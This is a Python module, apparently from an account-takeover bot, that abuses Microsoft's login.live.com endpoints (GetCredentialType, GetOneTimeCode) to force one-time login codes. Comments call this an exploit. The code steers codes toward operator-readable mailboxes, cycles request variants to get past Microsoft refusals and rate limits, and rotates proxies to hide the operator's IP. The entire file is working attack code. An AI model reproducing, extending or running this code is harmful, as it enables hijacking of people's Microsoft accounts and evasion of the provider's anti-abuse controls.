from securing.utils.cookies.get_livedata import livedata
from securing.auth.initial_session import get_session
from securing.utils.proxy import close_session
import asyncio
import json
import logging

import httpx

log = logging.getLogger(__name__)


def _pick_readable_proof(proofs: list, proof_hint: str | None) -> tuple[dict, bool]:
    """Choose the OTC proof we can actually read. Returns (proof, is_default).

    Microsoft sends the code to the *default* proof unless ``ProofConfirmation``
    names another one. If that inbox is not ours the code is unreachable, so
    the whole 2-step flow times out with ``no code arrived`` while MS reports a
    successful send. Prefer an explicit hint, then a proof whose masked display
    resolves to one of our mailboxes, then the default.
    """
    if not proofs:
        return {}, True
    hint = str(proof_hint or "").strip().lower()
    if hint:
        for item in proofs:
            if str(item.get("display") or "").strip().lower() == hint:
                return item, bool(item.get("isDefault"))
    try:
        from mail.settings import resolve_display_inbox
    except Exception:  # pragma: no cover - settings always importable in bot
        resolve_display_inbox = None  # type: ignore[assignment]
    if resolve_display_inbox is not None:
        for item in proofs:
            if resolve_display_inbox(item.get("display")):
                return item, bool(item.get("isDefault"))
    for item in proofs:
        if item.get("isDefault"):
            return item, True
    return proofs[0], False


async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -> dict | None:
    # GetCredential no longer forces OTPs
    # Uses a GetOneTimeCode exploit to force it
    send_auth = await session.post(
        url="https://login.live.com/GetCredentialType.srf",
        headers={
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33",
        },
        json={
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
            "forceotclogin": False,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": False,
            "isOtherIdpSupported": False,
            "isReactLoginRequest": True,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email,
        },
    )

    body = send_auth.text or ""
    print(f"SendAuth Response: {body[:800]}")
    if not body.strip():
        # Empty body is almost always a dead proxy tunnel / MS flake — retryable.
        log.error(
            "send_auth: empty GetCredentialType response status=%s for %s",
            send_auth.status_code,
            email,
        )
        raise httpx.RemoteProtocolError(
            f"GetCredentialType empty response (status={send_auth.status_code})"
        )

    try:
        email_info = send_auth.json()
    except json.JSONDecodeError as exc:
        log.error(
            "send_auth: non-JSON GetCredentialType status=%s for %s snippet=%r",
            send_auth.status_code,
            email,
            body[:400],
        )
        # Treat as transport flake so proxy retry / SSID rotate can kick in.
        raise httpx.RemoteProtocolError(
            f"GetCredentialType non-JSON response (status={send_auth.status_code})"
        ) from exc

    # There are secondary methods
    if "Credentials" in email_info:

        # Authenticator Request
        if "RemoteNgcParams" in email_info["Credentials"]:
            return {
                "type": "authenticator",
                "response": email_info,
            }

        # Email OTP Request
        if "OtcLoginEligibleProofs" in email_info["Credentials"]:

            proofs = email_info["Credentials"].get("OtcLoginEligibleProofs") or []
            chosen, chosen_is_default = _pick_readable_proof(proofs, proof)
            altemaile = chosen.get("data") or (proofs[0].get("data") if proofs else None)
            proof_display = chosen.get("display") or ""

            # Mailbox the code will land in, resolved from MS's masked display
            otc_inbox = None
            try:
                from mail.settings import resolve_display_inbox

                otc_inbox = resolve_display_inbox(proof_display)
            except Exception:
                otc_inbox = None
            if proof_display and not otc_inbox:
                log.warning(
                    "send_auth: OTC proof %s is not a readable mailbox for %s",
                    proof_display,
                    email,
                )

            # Get the login PPFT
            live = await livedata(session)
            flowtoken = live["ppft"]

            # GetOneTimeCode answers with a FlowToken even when it did NOT
            # dispatch anything ({"State":206,"FlowToken":...}). Treating that
            # token as proof of a send is what made the 2-step flow sit on an
            # empty inbox for minutes ("no code arrived in security mailbox")
            # while MS had quietly refused the request. Confirm the send via the
            # shared state rule and cycle the purpose/forceotclogin variants when
            # MS answers with a reject state.
            #
            # Rate-limit resilience: MS commonly returns State 204 ("not sent")
            # when too many OTP requests hit in a short window. Each rejected
            # attempt is backed off exponentially (1.5s, 3s, 6s, ...) so the
            # account has time to cool down before the next purpose is tried.
            from securing.utils.security_information import _gotc_state_ok

            # Two types of OTPs
            # eOTT_OtcLogin -> Account has a security email
            # eOTT_NoPasswordAccountLoginCode -> Primary receives OTPs
            # Right now only handles 1 security mail
            # (purpose, forceotclogin) — MS refuses the login purpose on some
            # accounts and only accepts the MFA/confirm ones.
            gotc_plan: list[tuple[str, bool]] = [
                ("eOTT_OtcLogin", False),
                ("eOTT_OtcLogin", True),
                ("eOTT_PrivProofConfirm", True),
                ("eOTT_ConfirmEmail", True),
            ]
            if proof_display and proof_display == email:
                gotc_plan.insert(0, ("eOTT_NoPasswordAccountLoginCode", False))

            gotc_flowtoken = None
            gotc_state = None
            gotc_sent = False
            gotc_hard_reject = None
            # Only steer MS to another proof when it is a different one; the
            # field is a proof name, not whatever we happened to have at hand.
            steer = proof or (proof_display if not chosen_is_default else None)

            gotc_fail_count = 0
            for idx, (purpose, force) in enumerate(gotc_plan):
                if idx:
                    # Space the retries out: MS throttles rapid repeats.
                    # Use longer, backoff-based delays so a rate-limited
                    # account has time to cool down between attempts.
                    delay = 1.5 * (2 ** (idx - 1))  # 1.5, 3.0, 6.0, ...
                    await asyncio.sleep(delay)
                payload = {
                    "login": email,
                    "flowtoken": flowtoken,
                    "purpose": purpose,
                    "channel": "Email",
                    "ChallengeViewSupported": 1,
                    "AltEmailE": altemaile,
                    "lcid": 1033,
                }
                if idx == 0 and steer:
                    payload["ProofConfirmation"] = steer
                if force:
                    # Reference bot retries the OTC with forceotclogin when MS
                    # answers without sending mail.
                    payload["forceotclogin"] = True

                gotc = await session.post(
                    url="https://login.live.com/GetOneTimeCode.srf?id=38936",
                    headers={
                        "Accept": "application/json",
                        "Content-type": "application/x-www-form-urlencoded",
                    },
                    data=payload,
                )
                print(
                    f"GetOneTimeCode[{purpose}]: {gotc.status_code} "
                    f"{(gotc.text or '')[:400]}"
                )

                # The FlowToken returned by GetOneTimeCode is the SentProofIDE
                # needed when submitting the code back (type 27/24 login posts).
                try:
                    body = gotc.json() or {}
                except Exception:
                    body = {}
                if not isinstance(body, dict):
                    body = {}
                state = body.get("State", body.get("state"))
                if state is not None:
                    gotc_state = state
                if gotc_flowtoken is None:
                    gotc_flowtoken = body.get("FlowToken") or body.get("flowToken")
                if _gotc_state_ok(body):
                    gotc_sent = True
                    gotc_flowtoken = (
                        body.get("FlowToken") or body.get("flowToken") or gotc_flowtoken
                    )
                    break
                err = body.get("error") or body.get("ErrorCode") or body.get("errorCode")
                gotc_hard_reject = err or state or gotc.status_code
                gotc_fail_count += 1
                log.warning(
                    "send_auth: GetOneTimeCode purpose=%s not sent for %s "
                    "(http=%s state=%s error=%s)",
                    purpose,
                    email,
                    gotc.status_code,
                    state,
                    err,
                )
                # State 206 = MS refused to send (not rate limit, more like
                # "this proof can't receive OTP"). Track for potential
                # proxy-vs-direct fallback below.
                if state in (206, 204):
                    gotc_fail_count += 1

            if not gotc_sent:
                # Some exit IPs make MS answer 206/204 on every purpose. Retry the
                # same request through a *fresh proxy exit* (a new sticky session
                # gets a different IP) before giving up - going direct would leak
                # the host IP to login.live.com, which is never acceptable here.
                if gotc_fail_count >= 3 and getattr(
                    session, "_autosecure_proxy_url", None
                ):
                    print(
                        "[~] - GOTC refused on this exit, retrying via a new proxy...",
                        flush=True,
                    )
                    retry_session = None
                    try:
                        retry_session = get_session()
                        for idx, (purpose, force) in enumerate(gotc_plan[:2]):
                            if idx:
                                await asyncio.sleep(2.0)
                            payload2 = {
                                "login": email,
                                "flowtoken": flowtoken,
                                "purpose": purpose,
                                "channel": "Email",
                                "ChallengeViewSupported": 1,
                                "AltEmailE": altemaile,
                                "lcid": 1033,
                            }
                            if force:
                                payload2["forceotclogin"] = True
                            gotc2 = await retry_session.post(
                                url="https://login.live.com/GetOneTimeCode.srf?id=38936",
                                headers={
                                    "Accept": "application/json",
                                    "Content-type": "application/x-www-form-urlencoded",
                                },
                                data=payload2,
                            )
                            print(
                                f"GetOneTimeCode[retry-{purpose}]: {gotc2.status_code} "
                                f"{(gotc2.text or '')[:300]}"
                            )
                            try:
                                body2 = gotc2.json() or {}
                            except Exception:
                                body2 = {}
                            if not isinstance(body2, dict):
                                body2 = {}
                            if _gotc_state_ok(body2):
                                gotc_sent = True
                                gotc_flowtoken = body2.get("FlowToken") or body2.get(
                                    "flowToken"
                                ) or gotc_flowtoken
                                print(
                                    "[+] - GOTC accepted on the fresh proxy exit",
                                    flush=True,
                                )
                                break
                    except Exception as exc:
                        log.warning("send_auth: proxy retry for GOTC failed: %s", exc)
                    finally:
                        await close_session(retry_session)

                # Say it plainly: nothing was mailed, so waiting on an inbox is
                # pointless. Callers use ``otc_sent`` to skip that wait.
                print(
                    "[X] - GetOneTimeCode: Microsoft did not dispatch the code "
                    f"(State={gotc_state})",
                    flush=True,
                )
                log.error(
                    "send_auth: OTC never dispatched for %s (proof=%s state=%s last=%s)",
                    email,
                    proof_display,
                    gotc_state,
                    gotc_hard_reject,
                )

            return {
                "type": "email",
                "response": email_info,
                "ppft": flowtoken,
                "gotc_flowtoken": gotc_flowtoken,
                "otc_destination": proof_display,
                "otc_inbox": otc_inbox,
                "otc_state": gotc_state,
                "otc_sent": gotc_sent,
            }

    return email_info
